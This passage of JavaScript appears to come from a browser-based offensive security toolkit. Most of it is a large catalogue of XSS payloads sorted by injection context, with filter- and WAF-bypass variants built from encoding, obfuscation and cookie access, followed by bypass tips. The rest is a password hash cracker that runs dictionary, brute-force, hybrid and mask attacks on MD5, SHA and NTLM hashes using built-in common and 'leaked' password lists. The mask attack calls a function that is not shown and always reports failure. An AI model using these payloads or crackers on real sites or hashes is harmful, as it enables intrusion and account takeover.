                "<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=>",
                "<object data='data:text/html,<script>alert(1)</script>'>",
                "<embed src='data:text/html,<script>alert(1)</script>'>",
                "<svg><script>alert&#40;1&#41;</script></svg>",
                "<img src=x onerror=alert&#40;1&#41;>",
                "<script>ale\u0072t(1)</script>",
                "<script>aler\u0074(1)</script>",
                "<script>eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029')</script>",
                "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
                "<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>",
                "<script>setTimeout`alert\\u0028'XSS'\\u0029`</script>"
            ],
            encoded: [
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "&lt;script&gt;alert('XSS')&lt;/script&gt;",
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "%3cscript%3ealert('XSS')%3c/script%3e",
                "<script>eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))</script>",
                "<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
                "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029>",
                "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>",
                "<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
                "<iframe src=j&#97;v&#97;script:alert(1)>",
                "<img src=x o&#110;error=alert(1)>",
                "<script>ale\\x72t(1)</script>",
                "<script>eval('\\141\\154\\145\\162\\164\\050\\061\\051')</script>"
            ]
        },
        attribute: {
            basic: [
                "\" onmouseover=\"alert('XSS')\"",
                "' autofocus onfocus='alert(1)'",
                "\" onclick=\"alert('XSS')\"",
                "' onload='alert(1)'",
                "\" onfocus=\"alert('XSS')\" autofocus=\"",
                "' onmouseover='alert(1)'",
                "\" onchange=\"alert('XSS')\"",
                "' oninput='alert(1)'",
                "\" onkeydown=\"alert('XSS')\"",
                "' onkeyup='alert(1)'",
                "\" onsubmit=\"alert('XSS')\"",
                "' onreset='alert(1)'",
                "\" onselect=\"alert('XSS')\"",
                "' ondblclick='alert(1)'",
                "\" oncontextmenu=\"alert('XSS')\"",
                "' ondrag='alert(1)'",
                "\" ondrop=\"alert('XSS')\"",
                "' onscroll='alert(1)'",
                "\" onresize=\"alert('XSS')\"",
                "' onerror='alert(1)'"
            ],
            filter: [
                "\" OnMouseOver=\"alert('XSS')\"",
                "' AUTOFOCUS ONFOCUS='alert(1)'",
                "\" onmouseover=\"prompt('XSS')\"",
                "' onfocus='confirm(1)' autofocus='",
                "\" style=\"background:url(javascript:alert('XSS'))\"",
                "' style='background:url(javascript:alert(1))'",
                "\" href=\"javascript:alert('XSS')\"",
                "' src='javascript:alert(1)'",
                "\" data=\"javascript:alert('XSS')\"",
                "' action='javascript:alert(1)'",
                "\" formaction=\"javascript:alert('XSS')\"",
                "' poster='javascript:alert(1)'",
                "\" background=\"javascript:alert('XSS')\"",
                "' dynsrc='javascript:alert(1)'",
                "\" lowsrc=\"javascript:alert('XSS')\"",
                "' onmouseover='eval(atob(\"YWxlcnQoMSk=\"))'",
                "\" onfocus=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\"",
                "' onclick='Function(\"alert(1)\")()'"
            ],
            waf: [
                "\" on%6DoUSEover=\"alert('XSS')\"",
                "' %6FnFocus='alert(1)' autofocus='",
                "\" &#111;nmouseover=\"alert('XSS')\"",
                "' &#111;nfocus='alert(1)' autofocus='",
                "\" onmouseover=\"al%65rt('XSS')\"",
                "' onfocus='ale%72t(1)' autofocus='",
                "\" onmouseover=\"&#97;&#108;&#101;&#114;&#116;('XSS')\"",
                "' onfocus='&#97;&#108;&#101;&#114;&#116;(1)' autofocus='",
                "\" onmouseover=\"\\u0061\\u006c\\u0065\\u0072\\u0074('XSS')\"",
                "' onfocus='\\u0061\\u006c\\u0065\\u0072\\u0074(1)' autofocus='",
                "\" onmouseover=\"eval(unescape('%61%6c%65%72%74%28%31%29'))\"",
                "' onfocus='eval(atob(\"YWxlcnQoMSk=\"))' autofocus='",
                "\" onmouseover=\"[]['constructor']['constructor']('alert(1)')()\"",
                "' onfocus='Function(atob(\"YWxlcnQoMSk=\"))()' autofocus='",
                "\" style=\"-moz-binding:url(javascript:alert('XSS'))\"",
                "' style='expression(alert(1))'",
                "\" style=\"background-image:url(javascript:alert('XSS'))\"",
                "' style='background:url(data:,alert(1))'"
            ],
            encoded: [
                "&#34; onmouseover=&#34;alert('XSS')&#34;",
                "&#39; onfocus=&#39;alert(1)&#39; autofocus=&#39;",
                "&quot; onmouseover=&quot;alert('XSS')&quot;",
                "&apos; onfocus=&apos;alert(1)&apos; autofocus=&apos;",
                "%22 onmouseover=%22alert('XSS')%22",
                "%27 onfocus=%27alert(1)%27 autofocus=%27",
                "\" onmouseover=\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\"",
                "' onfocus='&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;' autofocus='",
                "\" on%6DoUSEover=\"%61lert('XSS')\"",
                "' %6FnFocus='%61lert(1)' autofocus='"
            ]
        },
        javascript: {
            basic: [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "';alert(String.fromCharCode(88,83,83));//",
                "\";alert(String.fromCharCode(88,83,83));//",
                "';confirm('XSS');//",
                "\";confirm('XSS');//",
                "';prompt('XSS');//",
                "\";prompt('XSS');//",
                "';}alert('XSS');{//",
                "\";}alert('XSS');{//",
                "';alert(document.domain);//",
                "\";alert(document.domain);//",
                "';alert(document.cookie);//",
                "\";alert(document.cookie);//",
                "';console.log('XSS');//",
                "\";console.log('XSS');//",
                "');alert('XSS');//",
                "\");alert('XSS');//",
                "']alert('XSS');//",
                "\"]alert('XSS');//"
            ],
            filter: [
                "';ALERT('XSS');//",
                "\";ALERT('XSS');//",
                "';window.alert('XSS');//",
                "\";window.alert('XSS');//",
                "';top.alert('XSS');//",
                "\";top.alert('XSS');//",
                "';parent.alert('XSS');//",
                "\";parent.alert('XSS');//",
                "';self.alert('XSS');//",
                "\";self.alert('XSS');//",
                "';eval('alert(1)');//",
                "\";eval('alert(1)');//",
                "';Function('alert(1)')();//",
                "\";Function('alert(1)')();//",
                "';setTimeout('alert(1)',0);//",
                "\";setTimeout('alert(1)',0);//",
                "';setInterval('alert(1)',100);//",
                "\";setInterval('alert(1)',100);//"
            ],
            waf: [
                "';eval(atob('YWxlcnQoMSk='));//",
                "\";eval(atob('YWxlcnQoMSk='));//",
                "';eval(String.fromCharCode(97,108,101,114,116,40,49,41));//",
                "\";eval(String.fromCharCode(97,108,101,114,116,40,49,41));//",
                "';\u0061\u006c\u0065\u0072\u0074(1);//",
                "\";\u0061\u006c\u0065\u0072\u0074(1);//",
                "';ale\\x72t(1);//",
                "\";ale\\x72t(1);//",
                "';[]['constructor']['constructor']('alert(1)')();//",
                "\";[]['constructor']['constructor']('alert(1)')();//",
                "';(function(){return'alert(1)'})()['constructor']['constructor']('alert(1)')();//",
                "\";(function(){return'alert(1)'})()['constructor']['constructor']('alert(1)')();//",
                "';eval(unescape('%61%6c%65%72%74%28%31%29'));//",
                "\";eval(unescape('%61%6c%65%72%74%28%31%29'));//",
                "';eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'));//",
                "\";eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'));//"
            ],
            encoded: [
                "&#39;;alert(&#39;XSS&#39;);//",
                "&#34;;alert(&#34;XSS&#34;);//",
                "%27;alert(%27XSS%27);//",
                "%22;alert(%22XSS%22);//",
                "';&#97;&#108;&#101;&#114;&#116;('XSS');//",
                "\";&#97;&#108;&#101;&#114;&#116;(\"XSS\");//",
                "';\\u0061\\u006c\\u0065\\u0072\\u0074('XSS');//",
                "\";\\u0061\\u006c\\u0065\\u0072\\u0074(\"XSS\");//",
                "';\\x61\\x6c\\x65\\x72\\x74('XSS');//",
                "\";\\x61\\x6c\\x65\\x72\\x74(\"XSS\");//"
            ]
        },
        css: {
            basic: [
                "/**/expression(alert('XSS'))",
                "/**/expression(alert(1))",
                "/**/expression(confirm('XSS'))",
                "/**/expression(prompt('XSS'))",
                "javascript:alert('XSS')",
                "javascript:alert(1)",
                "javascript:confirm('XSS')",
                "javascript:prompt('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "data:text/html,<script>alert(1)</script>",
                "url(javascript:alert('XSS'))",
                "url(javascript:alert(1))",
                "url(data:text/html,<script>alert('XSS')</script>)",
                "url(data:text/html,<script>alert(1)</script>)"
            ],
            filter: [
                "/**/ expression(alert('XSS'))",
                "/* comment */ expression(alert(1))",
                "EXPRESSION(alert('XSS'))",
                "Expression(alert(1))",
                "JAVASCRIPT:alert('XSS')",
                "JavaScript:alert(1)",
                "url(JAVASCRIPT:alert('XSS'))",
                "url(JavaScript:alert(1))",
                "DATA:text/html,<script>alert('XSS')</script>",
                "Data:text/html,<script>alert(1)</script>"
            ],
            waf: [
                "/**/expr/**/ession(alert('XSS'))",
                "/**/java/**/script:alert(1)",
                "/**/ \\65 xpression(alert('XSS'))",
                "/**/ \\6A avascript:alert(1)",
                "/**/\\65\\78\\70\\72\\65\\73\\73\\69\\6F\\6E(alert('XSS'))",
                "/**/\\6A\\61\\76\\61\\73\\63\\72\\69\\70\\74:alert(1)",
                "url(&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert('XSS'))",
                "url(j&#97;v&#97;script:alert(1))",
                "url(\\6A \\61 \\76 \\61 \\73 \\63 \\72 \\69 \\70 \\74 :alert('XSS'))",
                "\\65\\78\\70\\72\\65\\73\\73\\69\\6F\\6E(alert(1))"
            ],
            encoded: [
                "&#47;&#42;&#42;&#47;expression(alert('XSS'))",
                "%2F%2A%2A%2Fexpression(alert(1))",
                "/**/&#101;&#120;&#112;&#114;&#101;&#115;&#115;&#105;&#111;&#110;(alert('XSS'))",
                "/**/&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)",
                "url(&#37;&#54;&#97;&#37;&#54;&#49;&#37;&#55;&#54;&#37;&#54;&#49;&#37;&#55;&#51;&#37;&#54;&#51;&#37;&#55;&#50;&#37;&#54;&#57;&#37;&#55;&#48;&#37;&#55;&#52;:alert('XSS'))"
            ]
        }
    };

    const selectedPayloads = payloads[context]?.[bypass] || payloads.html.basic;
    let result = `<strong>${context.toUpperCase()} Context - ${bypass.toUpperCase()} XSS Payloads:</strong>\n\n`;
    result += `Context: ${context}\nBypass Method: ${bypass}\nTotal Payloads: ${selectedPayloads.length}\n`;
    result += `Generated: ${new Date().toLocaleString()}\n\n`;

    selectedPayloads.forEach((payload, index) => {
        result += `${(index + 1).toString().padStart(2, '0')}. ${payload}\n`;
        result += `    Context: ${getXSSContext(payload)}\n`;
        result += `    Technique: ${getXSSTechnique(payload)}\n\n`;
    });

    // Add testing guidance
    result += `<strong>Testing Guidelines:</strong>\n`;
    result += `1. Test in different browsers (Chrome, Firefox, Safari, Edge)\n`;
    result += `2. Try URL encoding, HTML encoding, and Unicode encoding\n`;
    result += `3. Test with different positions in the application\n`;
    result += `4. Check for CSP (Content Security Policy) bypasses\n`;
    result += `5. Look for DOM-based XSS opportunities\n`;
    result += `6. Test with different user agents and referers\n\n`;

    result += `<strong>Common Filters to Bypass:</strong>\n`;
    result += `- script tag filtering: Use img, svg, iframe, object tags\n`;
    result += `- alert() filtering: Use confirm(), prompt(), console.log()\n`;
    result += `- Keyword filtering: Use encoding, case variation, or fragmentation\n`;
    result += `- Parentheses filtering: Use template literals or eval\n`;
    result += `- Quote filtering: Use template literals or encoded quotes\n\n`;

    result += `<strong>Warning:</strong> Only test on applications you own or have explicit permission to test.`;

    output.innerHTML = `<pre>${result}</pre>`;
    showMessage('XSS payloads generated successfully!', 'success');
}

function getXSSContext(payload) {
    if (payload.includes('<script>')) return 'HTML Script Tag';
    if (payload.includes('<img') || payload.includes('<svg') || payload.includes('<iframe')) return 'HTML Tag';
    if (payload.includes('onmouseover') || payload.includes('onfocus') || payload.includes('onclick')) return 'HTML Attribute';
    if (payload.includes('javascript:')) return 'URL/href Attribute';
    if (payload.includes('expression(') || payload.includes('url(')) return 'CSS Context';
    if (payload.includes('";') || payload.includes("';")) return 'JavaScript String';
    return 'General HTML';
}

function getXSSTechnique(payload) {
    if (payload.includes('String.fromCharCode') || payload.includes('atob') || payload.includes('eval')) return 'Encoding/Obfuscation';
    if (payload.includes('constructor')) return 'Function Constructor';
    if (payload.includes('template') || payload.includes('`')) return 'Template Literals';
    if (payload.includes('setTimeout') || payload.includes('setInterval')) return 'Async Execution';
    if (payload.includes('data:') || payload.includes('srcdoc')) return 'Data URI/Document';
    if (payload.includes('unicode') || payload.includes('\\u')) return 'Unicode Encoding';
    if (payload.includes('%') && payload.includes('2')) return 'URL Encoding';
    if (payload.includes('&#')) return 'HTML Entities';
    return 'Direct Execution';
}

// Global variables for hash cracking
let crackingInProgress = false;
let crackingWorker = null;

// Hash Cracker functions with advanced algorithms
async function crackHash() {
    const hash = document.getElementById('crackHash').value.trim().toLowerCase();
    const hashType = document.getElementById('crackHashType').value;
    const wordlistType = document.getElementById('wordlist').value;
    const attackMode = document.getElementById('attackMode').value;
    const maxLength = parseInt(document.getElementById('maxLength').value) || 6;
    const output = document.getElementById('crackOutput');
    const progressBar = document.getElementById('crackProgress');
    const statusElement = document.getElementById('crackStatus');

    if (!hash) {
        showMessage('Please enter a hash', 'error');
        return;
    }

    if (crackingInProgress) {
        showMessage('Cracking already in progress', 'warning');
        return;
    }

    // Check if CryptoJS is available
    if (typeof CryptoJS === 'undefined') {
        output.innerHTML = '<pre><strong style="color: #f44336;">Error:</strong> CryptoJS library not loaded. Please refresh the page.</pre>';
        showMessage('CryptoJS library not available', 'error');
        return;
    }

    crackingInProgress = true;

    // Comprehensive password lists
    const commonPasswords = [
        'password', '123456', '12345678', 'qwerty', '123456789', 'letmein', '1234567', 
        'football', 'iloveyou', 'admin', 'welcome', 'monkey', 'login', 'abc123', 
        'starwars', 'master', 'hello', 'freedom', 'whatever', 'qazwsx', 'dragon', 
        'shadow', 'michael', 'jennifer', 'computer', 'baseball', 'mustang', 'access', 
        'killer', 'trustno1', 'jordan', 'hunter', 'ranger', 'george', 'thomas', 
        'michelle', 'buster', 'batman', 'soccer', 'harley', 'hockey', 'internet', 
        'chicken', 'maggie', 'chicago', 'barney', 'amanda', 'sierra', 'testing', 
        'pass', 'test', 'guest', 'user', 'root', 'secret', 'asdf', 'zxcvbnm', 
        'password123', 'admin123', 'root123', 'test123', 'user123', 'guest123',
        'password1', 'admin1', 'root1', 'test1', 'user1', 'guest1', '12345',
        'password!', 'admin!', 'root!', 'test!', 'user!', 'guest!', 'p@ssw0rd',
        'P@ssw0rd', 'P@ssword', 'Password', 'Password!', 'Password1', 'Password123'
    ];

    const rockyouExtended = [
        // Top 1000 most common passwords
        '123456', 'password', '12345678', 'qwerty', '123456789', 'letmein', '1234567',
        'football', 'iloveyou', 'admin', 'welcome', 'monkey', 'login', 'abc123',
        'starwars', 'master', 'hello', 'freedom', 'whatever', 'qazwsx', 'dragon',
        'shadow', 'michael', 'jennifer', 'computer', 'baseball', 'mustang', 'access',
        'killer', 'trustno1', 'jordan', 'hunter', 'ranger', 'george', 'thomas',
        'michelle', 'buster', 'batman', 'soccer', 'harley', 'hockey', 'internet',
        'chicken', 'maggie', 'chicago', 'barney', 'amanda', 'sierra', 'testing',
        'sunshine', 'purple', 'butterfly', 'charlie', 'guitar', 'secret', 'love',
        'summer', 'flower', 'lovely', 'orange', 'princess', 'joshua', 'cheese',
        'amanda', 'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme',
        'matthew', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder',
        'taylor', 'matrix', 'william', 'corvette', 'hello', 'martin', 'heather',
        'secret', 'merlin', 'diamond', '1234567890', 'hammer', 'silver', '222222',
        '88888888', 'anthony', 'justin', 'test', 'bailey', 'q1w2e3r4t5', 'patrick',
        'internet', 'scooter', 'orange', 'tester', 'mickey', 'minnie', 'goofy'
    ];

    const leakedPasswords = [
        // From major data breaches
        'adobe123', 'linkedin', 'myspace1', 'yahoo123', 'gmail123', 'hotmail123',
        'rockyou', 'gawker', 'sony123', 'playstation', 'xbox360', 'nintendo',
        'facebook1', 'twitter1', 'instagram1', 'snapchat1', 'tiktok123', 'reddit123',
        'pinterest1', 'tumblr123', 'dropbox123', 'evernote1', 'lastpass1', 'keepass1',
        'bitwarden1', 'chrome123', 'firefox123', 'safari123', 'edge123', 'opera123'
    ];

    const advancedPatterns = generateAdvancedPatterns();

    let wordlist = [];
    switch(wordlistType) {
        case 'custom':
            wordlist = document.getElementById('customWordlist').value.split('\n').filter(w => w.trim());
            break;
        case 'rockyou':
            wordlist = [...rockyouExtended, ...advancedPatterns];
            break;
        case 'leaked':
            wordlist = [...leakedPasswords, ...commonPasswords, ...advancedPatterns];
            break;
        case 'common':
        default:
            wordlist = [...commonPasswords, ...advancedPatterns];
            break;
    }

    if (wordlist.length === 0) {
        showMessage('Wordlist is empty', 'error');
        crackingInProgress = false;
        return;
    }

    let found = false;
    let attempts = 0;
    const startTime = Date.now();
    let result = `<strong>Advanced Hash Cracking Session:</strong>\n\n`;
    result += `Target Hash: ${hash}\n`;
    result += `Hash Type: ${hashType.toUpperCase()}\n`;
    result += `Attack Mode: ${attackMode.toUpperCase()}\n`;
    result += `Wordlist: ${wordlistType} (${wordlist.length} entries)\n`;
    result += `Started: ${new Date().toLocaleString()}\n\n`;

    // Add hash analysis
    result += `<strong>Hash Analysis:</strong>\n`;
    result += `Length: ${hash.length} characters\n`;
    result += `Character Set: ${/^[a-f0-9]+$/i.test(hash) ? 'Hexadecimal' : 'Mixed/Unknown'}\n`;
    
    const hashInfo = analyzeHashFormat(hash);
    result += `Likely Types: ${hashInfo.types.join(', ')}\n`;
    result += `Confidence: ${hashInfo.confidence}\n\n`;

    try {
        output.innerHTML = `<pre>${result}<strong>Cracking in progress...</strong></pre>`;
        statusElement.textContent = 'Starting...';

        // Choose attack method based on mode
        switch(attackMode) {
            case 'dictionary':
                found = await dictionaryAttack(hash, hashType, wordlist, progressBar, statusElement, output, result);
                break;
            case 'bruteforce':
                found = await bruteForceAttack(hash, hashType, maxLength, progressBar, statusElement, output, result);
                break;
            case 'hybrid':
                found = await hybridAttack(hash, hashType, wordlist, progressBar, statusElement, output, result);
                break;
            case 'mask':
                const maskPattern = document.getElementById('maskPattern').value || '?u?l?l?l?l?d?d?d';
                found = await maskAttack(hash, hashType, maskPattern, progressBar, statusElement, output, result);
                break;
        }

        if (!found.success) {
            const endTime = Date.now();
            const duration = ((endTime - startTime) / 1000).toFixed(2);
            
            result += `<strong style="color: #f44336;">Hash Not Found</strong>\n\n`;
            result += `<strong>Session Summary:</strong>\n`;
            result += `Total Attempts: ${found.attempts.toLocaleString()}\n`;
            result += `Time Taken: ${duration} seconds\n`;
            result += `Average Speed: ${(found.attempts / parseFloat(duration)).toFixed(0)} hashes/second\n\n`;
            
            result += `<strong>Advanced Recommendations:</strong>\n`;
            result += `• Try hybrid attacks with rule mutations\n`;
            result += `• Use mask attacks with specific patterns\n`;
            result += `• Consider distributed cracking with hashcat\n`;
            result += `• Try rainbow tables from online databases\n`;
            result += `• Use GPU acceleration for faster cracking\n`;
            result += `• Check haveibeenpwned.com for password leaks\n\n`;
            
            output.innerHTML = `<pre>${result}</pre>`;
        }

    } catch (error) {
        result += `<strong style="color: #f44336;">Error during cracking:</strong> ${error.message}\n`;
        output.innerHTML = `<pre>${result}</pre>`;
        showMessage('Hash cracking failed', 'error');
    }

    crackingInProgress = false;
    progressBar.style.width = '0%';
    statusElement.textContent = found.success ? 'Completed successfully!' : 'Completed - no match found';
}

// Generate advanced password patterns
function generateAdvancedPatterns() {
    const patterns = [];
    const years = ['2024', '2023', '2022', '2021', '2020', '2019', '2018', '2017', '2016', '2015'];
    const months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];
    const common = ['password', 'admin', 'user', 'test', 'guest', 'root', 'login'];
    const keyboard = ['qwerty', 'asdf', 'zxcv', '1234', '1qaz', '2wsx', '3edc'];
    const symbols = ['!', '@', '#', '$', '%', '^', '&', '*'];
    
    // Year combinations
    years.forEach(year => {
        patterns.push(year);
        common.forEach(word => {
            patterns.push(word + year);
            patterns.push(word + year.slice(-2));
            patterns.push(word + '_' + year);
        });
    });
    
    // Month/date combinations
    months.forEach(month => {
        years.forEach(year => {
            patterns.push(month + year);
            patterns.push(month + year.slice(-2));
        });
    });
    
    // Keyboard patterns
    keyboard.forEach(kb => {
        patterns.push(kb);
        patterns.push(kb + '123');
        patterns.push(kb.toUpperCase());
        symbols.forEach(sym => {
            patterns.push(kb + sym);
            patterns.push(kb + sym + '123');
        });
    });
    
    // L33t speak variations
    const leetMap = {
        'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7', 'l': '1'
    };
    
    common.forEach(word => {
        let leetWord = word;
        Object.keys(leetMap).forEach(char => {
            leetWord = leetWord.replace(new RegExp(char, 'g'), leetMap[char]);
        });
        patterns.push(leetWord);
        patterns.push(leetWord.charAt(0).toUpperCase() + leetWord.slice(1));
    });
    
    return patterns;
}

// Dictionary attack implementation
async function dictionaryAttack(hash, hashType, wordlist, progressBar, statusElement, output, result) {
    let attempts = 0;
    const startTime = Date.now();
    
    for (let i = 0; i < wordlist.length && crackingInProgress; i++) {
        const word = wordlist[i].trim();
        if (!word) continue;

        attempts++;
        const testHash = await generateHash(word, hashType);

        if (testHash === hash) {
            const endTime = Date.now();
            const duration = ((endTime - startTime) / 1000).toFixed(2);
            
            result += `<strong style="color: #4caf50;">🎉 HASH CRACKED! 🎉</strong>\n\n`;
            result += `<strong>Results:</strong>\n`;
            result += `Plaintext: ${word}\n`;
            result += `Hash Type: ${hashType.toUpperCase()}\n`;
            result += `Attack Mode: Dictionary\n`;
            result += `Attempts: ${attempts.toLocaleString()}\n`;
            result += `Time Taken: ${duration} seconds\n`;
            result += `Speed: ${(attempts / parseFloat(duration)).toFixed(0)} hashes/second\n\n`;
            
            result += `<strong>Password Analysis:</strong>\n`;
            result += analyzePassword(word);
            
            output.innerHTML = `<pre>${result}</pre>`;
            showMessage('Hash cracked successfully!', 'success');
            return { success: true, attempts, plaintext: word };
        }

        // Update progress
        if (attempts % 50 === 0) {
            const progress = (i / wordlist.length) * 100;
            progressBar.style.width = progress + '%';
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
            const speed = (attempts / parseFloat(elapsed)).toFixed(0);
            statusElement.textContent = `Testing: ${word} (${attempts}/${wordlist.length}) - ${speed} h/s`;
            
            await new Promise(resolve => setTimeout(resolve, 1));
        }
    }
    
    return { success: false, attempts };
}

// Brute force attack implementation
async function bruteForceAttack(hash, hashType, maxLength, progressBar, statusElement, output, result) {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let attempts = 0;
    const startTime = Date.now();
    
    for (let length = 1; length <= maxLength && crackingInProgress; length++) {
        const totalCombinations = Math.pow(charset.length, length);
        
        for (let i = 0; i < totalCombinations && crackingInProgress; i++) {
            const candidate = generateBruteForceCandidate(i, length, charset);
            attempts++;
            
            const testHash = await generateHash(candidate, hashType);
            
            if (testHash === hash) {
                const endTime = Date.now();
                const duration = ((endTime - startTime) / 1000).toFixed(2);
                
                result += `<strong style="color: #4caf50;">🎉 HASH CRACKED! 🎉</strong>\n\n`;
                result += `<strong>Results:</strong>\n`;
                result += `Plaintext: ${candidate}\n`;
                result += `Hash Type: ${hashType.toUpperCase()}\n`;
                result += `Attack Mode: Brute Force\n`;
                result += `Length: ${length} characters\n`;
                result += `Attempts: ${attempts.toLocaleString()}\n`;
                result += `Time Taken: ${duration} seconds\n`;
                result += `Speed: ${(attempts / parseFloat(duration)).toFixed(0)} hashes/second\n\n`;
                
                output.innerHTML = `<pre>${result}</pre>`;
                showMessage('Hash cracked successfully!', 'success');
                return { success: true, attempts, plaintext: candidate };
            }
            
            // Update progress
            if (attempts % 1000 === 0) {
                const totalProgress = ((length - 1) * Math.pow(charset.length, maxLength) + i) / 
                                   (Math.pow(charset.length, maxLength + 1) - 1) * 100;
                progressBar.style.width = Math.min(totalProgress, 100) + '%';
                const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
                const speed = (attempts / parseFloat(elapsed)).toFixed(0);
                statusElement.textContent = `Brute force: ${candidate} (${attempts} attempts) - ${speed} h/s`;
                
                await new Promise(resolve => setTimeout(resolve, 1));
            }
        }
    }
    
    return { success: false, attempts };
}

// Generate brute force candidate
function generateBruteForceCandidate(index, length, charset) {
    let result = '';
    let temp = index;
    
    for (let i = 0; i < length; i++) {
        result = charset[temp % charset.length] + result;
        temp = Math.floor(temp / charset.length);
    }
    
    return result.padStart(length, charset[0]);
}

// Hybrid attack (dictionary + mutations)
async function hybridAttack(hash, hashType, wordlist, progressBar, statusElement, output, result) {
    let attempts = 0;
    const startTime = Date.now();
    const mutations = ['123', '1', '12', '2023', '2024', '!', '@', '#', '$', '321'];
    
    for (let i = 0; i < wordlist.length && crackingInProgress; i++) {
        const baseWord = wordlist[i].trim();
        if (!baseWord) continue;
        
        // Try base word
        attempts++;
        let testHash = await generateHash(baseWord, hashType);
        if (testHash === hash) {
            return { success: true, attempts, plaintext: baseWord };
        }
        
        // Try mutations
        for (const mutation of mutations) {
            if (!crackingInProgress) break;
            
            // Append mutation
            attempts++;
            const candidate1 = baseWord + mutation;
            testHash = await generateHash(candidate1, hashType);
            if (testHash === hash) {
                const duration = ((Date.now() - startTime) / 1000).toFixed(2);
                result += `<strong style="color: #4caf50;">🎉 HASH CRACKED! 🎉</strong>\n\n`;
                result += `Plaintext: ${candidate1}\nMutation: ${baseWord} + ${mutation}\n`;
                output.innerHTML = `<pre>${result}</pre>`;
                return { success: true, attempts, plaintext: candidate1 };
            }
            
            // Prepend mutation
            attempts++;
            const candidate2 = mutation + baseWord;
            testHash = await generateHash(candidate2, hashType);
            if (testHash === hash) {
                const duration = ((Date.now() - startTime) / 1000).toFixed(2);
                result += `<strong style="color: #4caf50;">🎉 HASH CRACKED! 🎉</strong>\n\n`;
                result += `Plaintext: ${candidate2}\nMutation: ${mutation} + ${baseWord}\n`;
                output.innerHTML = `<pre>${result}</pre>`;
                return { success: true, attempts, plaintext: candidate2 };
            }
            
            // Capitalize + mutation
            attempts++;
            const candidate3 = baseWord.charAt(0).toUpperCase() + baseWord.slice(1) + mutation;
            testHash = await generateHash(candidate3, hashType);
            if (testHash === hash) {
                const duration = ((Date.now() - startTime) / 1000).toFixed(2);
                result += `<strong style="color: #4caf50;">🎉 HASH CRACKED! 🎉</strong>\n\n`;
                result += `Plaintext: ${candidate3}\nMutation: Capitalize + ${mutation}\n`;
                output.innerHTML = `<pre>${result}</pre>`;
                return { success: true, attempts, plaintext: candidate3 };
            }
        }
        
        // Update progress
        if (attempts % 100 === 0) {
            const progress = (i / wordlist.length) * 100;
            progressBar.style.width = progress + '%';
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
            const speed = (attempts / parseFloat(elapsed)).toFixed(0);
            statusElement.textContent = `Hybrid: ${baseWord} (${attempts} attempts) - ${speed} h/s`;
            
            await new Promise(resolve => setTimeout(resolve, 1));
        }
    }
    
    return { success: false, attempts };
}

// Mask attack implementation
async function maskAttack(hash, hashType, maskPattern, progressBar, statusElement, output, result) {
    const charsets = {
        '?l': 'abcdefghijklmnopqrstuvwxyz',
        '?u': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
        '?d': '0123456789',
        '?s': '!@#$%^&*()_+-=[]{}|;:,.<>?',
        '?a': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?',
        '?': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    };
    
    // Parse mask pattern
    const positions = [];
    let i = 0;
    while (i < maskPattern.length) {
        if (maskPattern[i] === '?' && i + 1 < maskPattern.length) {
            const maskChar = '?' + maskPattern[i + 1];
            if (charsets[maskChar]) {
                positions.push(charsets[maskChar]);
                i += 2;
            } else {
                positions.push(charsets['?']);
                i += 1;
            }
        } else {
            positions.push([maskPattern[i]]);
            i++;
        }
    }
    
    let attempts = 0;
    const startTime = Date.now();
    const totalCombinations = positions.reduce((acc, pos) => acc * (typeof pos === 'string' ? pos.length : pos.length), 1);
    
    // Generate all combinations
    await generateMaskCombinations(positions, 0, '', hash, hashType, attempts, totalCombinations, startTime, progressBar, statusElement, output, result);
    
    return { success: false, attempts };
}

// Generate hash using specified algorithm
async function generateHash(text, hashType) {
    switch(hashType) {
        case 'md5':
            return CryptoJS.MD5(text).toString();
        case 'sha1':
            return CryptoJS.SHA1(text).toString();
        case 'sha256':
            return CryptoJS.SHA256(text).toString();
        case 'sha512':
            return CryptoJS.SHA512(text).toString();
        case 'ntlm':
            return CryptoJS.MD4(CryptoJS.enc.Utf16LE.parse(text)).toString();
        default:
            return CryptoJS.MD5(text).toString();
    }
}

// Stop cracking function
function stopCracking() {
    crackingInProgress = false;
    const statusElement = document.getElementById('crackStatus');
    const progressBar = document.getElementById('crackProgress');
    
    if (statusElement) statusElement.textContent = 'Stopped by user';
    if (progressBar) progressBar.style.width = '0%';
    
    showMessage('Hash cracking stopped', 'info');
}

function analyzeHashFormat(hash) {
    const length = hash.length;
